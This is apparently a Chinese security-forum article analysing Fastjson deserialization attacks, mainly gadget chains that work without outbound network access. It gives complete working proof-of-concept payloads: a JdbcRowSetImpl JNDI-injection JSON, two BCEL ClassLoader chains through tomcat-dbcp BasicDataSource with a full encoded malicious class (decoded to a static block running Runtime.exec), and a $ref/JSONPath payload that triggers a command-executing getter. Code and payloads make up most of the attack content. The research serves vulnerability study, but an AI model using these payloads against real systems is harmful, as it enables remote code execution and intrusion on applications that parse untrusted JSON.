### 0x01 出网利用

由于本文是对不出网利用进行的分析，这里出网的利用就是引子，不做详细分析。

#### JdbcRowSetImpl

在JdbcRowSetImpl中存在JNDI注入

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-c5945f2e2d5592dc831876e5058091eadb196eb5.png)

这里考虑setAutoCommit

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-e4de11fe08ec69e9b7928884a038ac74346e2b5e.png)

是个set方法

参数是布尔类型的

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-185b3970e41d08896f9fedfb61d5526b35b85ea4.png)

使用Yakit生成一个反连

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-14f1fd93379853ccea334599f5c5336240b32935.png)

构造EXP

首先类名是`com.sun.rowset.JdbcRowSetImpl` 也就是`@type` 的值

接着是`.lookup`的参数`DataSourceName` 也就是rmi或ldap的地址

最后是`AutoCommit` 布尔型的参数

```java
public class FastJsonJdbcRowSetImpl {
    public static void main(String[] args) throws Exception{

        String s = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"DataSourceName\":\"ldap://127.0.0.1:8085/ZhALlpnN\",\"AutoCommit\":false}";
        JSON.parseObject(s);
    }
}
```

但是这种利用方式是需要出网的，并且有版本、依赖限制

下面来看一个可以本地利用的

### 0x02 不出网利用

#### BCEL

可以去看P牛的解释[BCEL ClassLoader去哪了 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html)

fastjson≤1.2.24

条件:`BasicDataSource`只需要有`dbcp`或`tomcat-dbcp`的依赖即可，dbcp即数据库连接池，在java中用于管理数据库连接，还是挺常见的。

在`ClassLoader` 存在一处`loadclass`

```java
protected Class loadClass(String class_name, boolean resolve)
    throws ClassNotFoundException
  {
    Class cl = null;

    /* First try: lookup hash table.
     */
    if((cl=(Class)classes.get(class_name)) == null) {
      /* Second try: Load system class using system class loader. You better
       * don't mess around with them.
       */
      for(int i=0; i < ignored_packages.length; i++) {
        if(class_name.startsWith(ignored_packages[i])) {
          cl = deferTo.loadClass(class_name);
          break;
        }
      }

      if(cl == null) {
        JavaClass clazz = null;

        /* Third try: Special request?
         */
        if(class_name.indexOf("$$BCEL$$") >= 0)
          clazz = createClass(class_name);
        else { // Fourth try: Load classes via repository
          if ((clazz = repository.loadClass(class_name)) != null) {
            clazz = modifyClass(clazz);
          }
          else
            throw new ClassNotFoundException(class_name);
        }

        if(clazz != null) {
          byte[] bytes  = clazz.getBytes();
          cl = defineClass(class_name, bytes, 0, bytes.length);
        } else // Fourth try: Use default class loader
          cl = Class.forName(class_name);
      }

      if(resolve)
        resolveClass(cl);
    }

    classes.put(class_name, cl);

    return cl;
  }
```

当类名是以`$$BCEL$$` 开头，就会创建一个该类，并用definclass去调用

BCEL提供两个类，`Repository`和`Utility`

`Repository`用于将一个`Java Class`先转换成原生字节码，当然这里也可以直接使用javac命令来编译java文件生成字节码

`Utility`用于将原生的字节码转换成BCEL格式的字节码

其中`createClass` 方法中

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-27c5dc2631e7b2383f3f68f0bf5b1a330110162a.png)

存入到字节数组中时会调用`Utility`的`decode`方法，所以利用的时候要记得`encode`

```java
package org.example;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import java.io.IOException;

/**
 * @Author kilo、冰室/ki10Moc
 * @date 2022/11/7
 * @time 14:30
 * @blog http://ki10.top
 **/
public class FastJsonBcel {
    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException {
        JavaClass javaClass = Repository.lookupClass(Evil.class);
        String encode = Utility.encode(javaClass.getBytes(), true);
        System.out.println(encode);
        Class.forName("$$BCEL$$" + encode, true, new ClassLoader());
        //        new ClassLoader().loadClass("$$BCEL$$" + encode).newInstance();
    }
}
```

那么下面就来看这里是怎么利用起来的

这次我们尝试以漏洞发现者的身份来看这条链子

首先是`org.apache.tomcat.dbcp.dbcp2.BasicDataSource#createConnectionFactory()`

```java
protected ConnectionFactory createConnectionFactory() throws SQLException {
        // Load the JDBC driver class
        Driver driverToUse = this.driver;

        if (driverToUse == null) {
            Class<?> driverFromCCL = null;
            if (driverClassName != null) {
                try {
                    try {
                        if (driverClassLoader == null) {
                            driverFromCCL = Class.forName(driverClassName);
                        } else {
                            driverFromCCL = Class.forName(driverClassName, true, driverClassLoader);
                        }
                    } catch (final ClassNotFoundException cnfe) {
                        driverFromCCL = Thread.currentThread().getContextClassLoader().loadClass(driverClassName);
                    }
                } catch (final Exception t) {
                    final String message = "Cannot load JDBC driver class '" + driverClassName + "'";
                    logWriter.println(message);
                    t.printStackTrace(logWriter);
                    throw new SQLException(message, t);
                }
            }

            try {
                if (driverFromCCL == null) {
                    driverToUse = DriverManager.getDriver(url);
                } else {
                    // Usage of DriverManager is not possible, as it does not
                    // respect the ContextClassLoader
                    // N.B. This cast may cause ClassCastException which is handled below
                    driverToUse = (Driver) driverFromCCL.getConstructor().newInstance();
                    if (!driverToUse.acceptsURL(url)) {
                        throw new SQLException("No suitable driver", "08001");
                    }
                }
            } catch (final Exception t) {
                final String message = "Cannot create JDBC driver of class '"
                        + (driverClassName != null ? driverClassName : "") + "' for connect URL '" + url + "'";
                logWriter.println(message);
                t.printStackTrace(logWriter);
                throw new SQLException(message, t);
            }
        }

        // Set up the driver connection factory we will use
        final String user = userName;
        if (user != null) {
            connectionProperties.put("user", user);
        } else {
            log("DBCP DataSource configured without a 'username'");
        }

        final String pwd = password;
        if (pwd != null) {
            connectionProperties.put("password", pwd);
        } else {
            log("DBCP DataSource configured without a 'password'");
        }

        final ConnectionFactory driverConnectionFactory = new DriverConnectionFactory(driverToUse, url,
                connectionProperties);
        return driverConnectionFactory;
    }
```

我们来看关键部分

```java
if (driverClassLoader == null) {
                            driverFromCCL = Class.forName(driverClassName);
                        } else {
                            driverFromCCL = Class.forName(driverClassName, true, driverClassLoader);
                        }
```

若存在`driverClassLoader` 则会对类进行初始化

这里的`driverClassName` 和`driverClassLoader` 都是可控的

这里就可以考虑将`driverClassLoader` 的参数写为`com.sun.org.apache.bcel.internal.util.ClassLoader`

接着

在`org.apache.tomcat.dbcp.dbcp2.BasicDataSource#createDataSource()` 中调用了`createConnectionFactory()`

```java
protected DataSource createDataSource() throws SQLException {
        if (closed) {
            throw new SQLException("Data source is closed");
        }

        // Return the pool if we have already created it
        // This is double-checked locking. This is safe since dataSource is
        // volatile and the code is targeted at Java 5 onwards.
        if (dataSource != null) {
            return dataSource;
        }
        synchronized (this) {
            if (dataSource != null) {
                return dataSource;
            }

            jmxRegister();

            // create factory which returns raw physical connections
            final ConnectionFactory driverConnectionFactory = createConnectionFactory();

            // Set up the poolable connection factory
            boolean success = false;
            PoolableConnectionFactory poolableConnectionFactory;
            try {
                poolableConnectionFactory = createPoolableConnectionFactory(driverConnectionFactory);
                poolableConnectionFactory.setPoolStatements(poolPreparedStatements);
                poolableConnectionFactory.setMaxOpenPreparedStatements(maxOpenPreparedStatements);
                success = true;
            } catch (final SQLException se) {
                throw se;
            } catch (final RuntimeException rte) {
                throw rte;
            } catch (final Exception ex) {
                throw new SQLException("Error creating connection factory", ex);
            }

            if (success) {
                // create a pool for our connections
                createConnectionPool(poolableConnectionFactory);
            }

            // Create the pooling data source to manage connections
            DataSource newDataSource;
            success = false;
            try {
                newDataSource = createDataSourceInstance();
                newDataSource.setLogWriter(logWriter);
                success = true;
            } catch (final SQLException se) {
                throw se;
            } catch (final RuntimeException rte) {
                throw rte;
            } catch (final Exception ex) {
                throw new SQLException("Error creating datasource", ex);
            } finally {
                if (!success) {
                    closeConnectionPool();
                }
            }

            // If initialSize > 0, preload the pool
            try {
                for (int i = 0; i < initialSize; i++) {
                    connectionPool.addObject();
                }
            } catch (final Exception e) {
                closeConnectionPool();
                throw new SQLException("Error preloading the connection pool", e);
            }

            // If timeBetweenEvictionRunsMillis > 0, start the pool's evictor task
            startPoolMaintenance();

            dataSource = newDataSource;
            return dataSource;
        }
    }
```

这里需要让

```java
if (dataSource != null) {
            return dataSource;
        }
        synchronized (this) {
            if (dataSource != null) {
                return dataSource;
            }
```

均为false才能调用

之后

在`org.apache.tomcat.dbcp.dbcp2.BasicDataSource#getConnection()` 调用

```java
public Connection getConnection() throws SQLException {
        if (Utils.IS_SECURITY_ENABLED) {
            final PrivilegedExceptionAction<Connection> action = new PaGetConnection();
            try {
                return AccessController.doPrivileged(action);
            } catch (final PrivilegedActionException e) {
                final Throwable cause = e.getCause();
                if (cause instanceof SQLException) {
                    throw (SQLException) cause;
                }
                throw new SQLException(e);
            }
        }
        return createDataSource().getConnection();
    }
```

#### 链子的整体流程

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-f968323f6dac0d58f837096d5f21cbfdb9b9ad60.png)

#### poc详解

poc(这里先贴上，后面在解释)

```java
package org.example;

import com.alibaba.fastjson.JSON;

/**
 * @Author kilo、冰室/ki10Moc
 * @date 2022/11/7
 * @time 14:30
 * @blog http://ki10.top
 **/

public class FastJsonBcel {
    public static void main(String[] args){
        String payload2 = "{\n" +
                "    {\n" +
                "        \"ki10\":{\n" +
                "                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuQ$cbN$db$40$U$3d$938$b1c$9c$e6A$D$94$a6o$k$81E$zPw$m6$V$95$aa$baM$d5$m$ba$9eL$a7a$82cG$f6$84$a6_$c4$3a$hZ$b1$e8$H$f0Q$88$3b$sM$pAG$f2$7d$ce9$f7$dc$f1$d5$f5$e5$l$Ao$b0$e1$c2$c1$b2$8b$V$3cr$b0j$fcc$hM$X$F$3c$b1$f1$d4$c63$86$e2$be$8a$94$3e$60$c8$b7$b6$8e$Z$ac$b7$f17$c9P$JT$q$3f$8d$G$5d$99$i$f1nH$95z$Q$L$k$k$f3D$99$7cZ$b4$f4$89J$Z$9a$81$88$H$fep$87$ff$dc$fd$a1$o$ff$3bOu$3f$8d$p$ff$f0L$85$7b$M$ce$be$I$a7C$Y$81$gA$9f$9fq_$c5$fe$fb$f6$e1X$c8$a1VqD$d7$ca$j$cd$c5$e9G$3e$cc$c8I$t$83$db$89G$89$90$ef$94$ZV2t$af$N$d6C$J$ae$8d$e7$k$5e$e0$r$a9$ma$c2$c3$x$ac1$y$de$c3$eda$j$$$c3$ea$ffE2T3$5c$c8$a3$9e$df$ee$f6$a5$d0$M$b5$7f$a5$_$a3H$ab$Bip$7bR$cf$92Fk$x$b8s$87$W$b1$e4X$K$86$cd$d6$5c$b7$a3$T$V$f5$f6$e6$B$9f$93X$c84$r$40eHM$9d$ad$7f$94p$ni$z$9b$7e$9c990$b3$y$d9$F$ca$7c$f2$8c$7ca$fb$X$d8$qk$7bd$8b$b7E$94$c9z$d3$f8$B$w$e4$jTg$60$9e$91$B$f5$df$c8$d5$f3$X$b0$be$9e$c3$f9$b0$7d$81$e2$q$ab$97$I$5b$40$3ec$5c$a2$c8$a0K$844$af$5d$s$96$gE$7f$t$94aQ$5e$a7l$91$3e$h$b9$c0$c6C$8b$g$8dL$d4$d2$N_$9f$94$o$82$C$A$A\"\n" +
                "        }\n" +
                "    }: \"Moc\"\n" +
                "}";
        JSON.parse(payload2);
    }
}
```

需要注意的是

这里poc的嵌套

最后`JSON.parse` 触发`key.toString()`

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-adced1cd11190343584ed0f07523486cd517995c.png)

整个poc都为`JSONObject` ，`value`为`Moc`

然后判断是否是`JSON`对象，再去识别`key`和`value`

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-f3adf7c7a0ecba4e4ace681b8ede00d380b6ec01.png)

调试过程中确实两次落在该断点

```java
key = (key == null) ? "null" : key.toString();
```

而在执行toString() 时会将当前类转为字符串形式，会提取类中所有的Field，执行相应的 getter 、is等方法。因此也会执行getConnection方法

当然以上都是建立在`parse()` 方法之上

如果poc是`parseObject()` ，那就简单了，因为在处理过程中会调用所有的 setter 和 getter 方法。详细可以看FastJson反序列化基础

poc

```java
package org.example;

import com.alibaba.fastjson.JSON;

/**
 * @Author kilo、冰室/ki10Moc
 * @date 2022/11/7
 * @time 14:30
 * @blog http://ki10.top
 **/

public class FastJsonBcel {
    public static void main(String[] args) {
String s = "{\n" +
                "               \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuQ$cbN$db$40$U$3d$938$b1c$9c$e6A$D$94$a6o$k$81E$zPw$m6$V$95$aa$baM$d5$m$ba$9eL$a7a$82cG$f6$84$a6_$c4$3a$hZ$b1$e8$H$f0Q$88$3b$sM$pAG$f2$7d$ce9$f7$dc$f1$d5$f5$e5$l$Ao$b0$e1$c2$c1$b2$8b$V$3cr$b0j$fcc$hM$X$F$3c$b1$f1$d4$c63$86$e2$be$8a$94$3e$60$c8$b7$b6$8e$Z$ac$b7$f17$c9P$JT$q$3f$8d$G$5d$99$i$f1nH$95z$Q$L$k$k$f3D$99$7cZ$b4$f4$89J$Z$9a$81$88$H$fep$87$ff$dc$fd$a1$o$ff$3bOu$3f$8d$p$ff$f0L$85$7b$M$ce$be$I$a7C$Y$81$gA$9f$9fq_$c5$fe$fb$f6$e1X$c8$a1VqD$d7$ca$j$cd$c5$e9G$3e$cc$c8I$t$83$db$89G$89$90$ef$94$ZV2t$af$N$d6C$J$ae$8d$e7$k$5e$e0$r$a9$ma$c2$c3$x$ac1$y$de$c3$eda$j$$$c3$ea$ffE2T3$5c$c8$a3$9e$df$ee$f6$a5$d0$M$b5$7f$a5$_$a3H$ab$Bip$7bR$cf$92Fk$x$b8s$87$W$b1$e4X$K$86$cd$d6$5c$b7$a3$T$V$f5$f6$e6$B$9f$93X$c84$r$40eHM$9d$ad$7f$94p$ni$z$9b$7e$9c990$b3$y$d9$F$ca$7c$f2$8c$7ca$fb$X$d8$qk$7bd$8b$b7E$94$c9z$d3$f8$B$w$e4$jTg$60$9e$91$B$f5$df$c8$d5$f3$X$b0$be$9e$c3$f9$b0$7d$81$e2$q$ab$97$I$5b$40$3ec$5c$a2$c8$a0K$844$af$5d$s$96$gE$7f$t$94aQ$5e$a7l$91$3e$h$b9$c0$c6C$8b$g$8dL$d4$d2$N_$9f$94$o$82$C$A$A\"\n" +
                "        }";
        JSON.parseObject(s);
    }
}
```

![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-bccd3c02fc9788f25823ad716e824d89dd7b5505.png)

上面我们说了那么多，基本已经走完了流程，但还有个问题，这里的`driverClassName` 后面的值是什么，下面就来解释下上面贴出的`poc`中那一长串是什么

可能还要到`com.sun.org.apache.bcel.internal.util.ClassLoader` 去找答案

这里我们说，我们是通过`loadClass`下重写的方法来执行的，其中有个`defiClass` 显然是通过字节码来实现的。再回过头看`createClass`中的`Utility.decode`

这里我们还原一下内容

```java
public class BCELDecode {
    public static void main(String[] args) throws IOException {
        String encode = "$l$8b$I$A$A$A$A$A$A$A...";
        byte[] decode = Utility.decode(encode,true);
        FileOutputStream fileOutputStream = new FileOutputStream("DecodeClass.class");
        fileOutputStream.write(decode);
    }
}
```

得到`DecodeClass.class`

实际上就是静态方法里面执行弹计算器

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package com.p1ay2win.fastjson;

import java.io.IOException;

public class Evil {
    public Evil() {
    }

    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException var1) {
            var1.printStackTrace();
        }

    }
}
```

### 0x03 `JSON.parse`如何调用`get`方法

#### $ref

这里要探究的就是，当只存在`parse`和`get`方法时，还能否利用

JSONPath

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-8a31dcc03d6984e0d94818a1a8b65b221e13ad2f.png)

添加依赖

```java
<dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.36</version>
        </dependency>
```

先写一个接受`cmd`参数的`rce`的`Test`类

```java
package org.example;

import java.io.IOException;

/**
 * @Author kilo、冰室/ki10Moc
 * @date 2022/11/14
 * @time 0:06
 * @blog http://ki10.top
 **/
public class Test {
    private String cmd;

    public String getCmd() throws IOException {
        Runtime.getRuntime().exec(cmd);
        return cmd;
    }

    public void setCmd(String cmd) {
        this.cmd = cmd;
    }
}
```

执行函数

```java
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * @Author kilo、冰室/ki10Moc
 * @date 2022/11/14
 * @time 0:10
 * @blog http://ki10.top
 **/
public class TestCalc {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "[{\"@type\":\"org.example.Test\",\"cmd\":\"calc\"},{\"$ref\":\"$[0].cmd\"}]";
        Object o = JSON.parse(payload);
    }

}
```

![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-2cdf297e5488696df003582f1857143e7d35c1b4.png)

首先就是我们要弄清该`payload`，就需要知道`[{\"@type\":\"org.example.Test\",\"cmd\":\"calc\"},{\"$ref\":\"$[0].cmd\"}]` ref的作用

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-f9ac13d3f93aa7d6eea24ce38c5b873e82e5ffa8.png)

#### Debug流程

打上断点来debug下

首先是`handleResovleTask`

这里是处理`refvalue`的地方

首先判断是否是$开头，然后获取对象，最后确定ref：`$[0].cmd`

`$[0]`表示的是数组里的第一个元素，则`$[0].cmd`表示的是获取第一个元素的cmd属性的值。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-fcf6e2f2a5a3e8e37c33fb9d7a349d99252288fa.png)

跟进到`getObject()`

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-3a6c0ea4563a1d9235897f7ef1457c70fce48e8d.png)

获取数组，第0个位`$` ，第1个为`$[0]` 并返回该对象

下面是`JSONPath.eval()`

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-d47ddaa764bdc8bbdabb1c32f6c12e43c674c10b.png)

继续跟进`compile()`

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-b191de271b3af77cfd21c4381f4d81476f2366fc.png)

这里路径不为空，不会抛出异常

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-25bde4825973ee0ecd4aeb3f5b2efcac415ed417.png)

接着跟进`eval`下的`init()`

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-6e4b9f31871347fc613e71379df22fb4baadcc45.png)

这里segments为空，继续往下走

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-5479aea16256e23532d753cf179fceb71d4d52dc.png)

在调用`parser.explain()` 方法前`segments`为空

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-a6ae315ce00fd80477d6b97a8bc74572090435a5.png)

这里`segment`值就变成了`JSONPath`

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-c5e4968023184d32489b2d84ac03adddcbf2e0c4.png)

循环追加到`StringBuilder`后面

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-8d1090cc17ba599b72d39875124b1f486bbf7f94.png)

然后按顺序执行前面`explain`()生成的`Segment array`

最终在`getPropertyValue()`反射调用`get()`

至此，就完成了不使用`JSON.parseObject`也能调用`get()` 的方法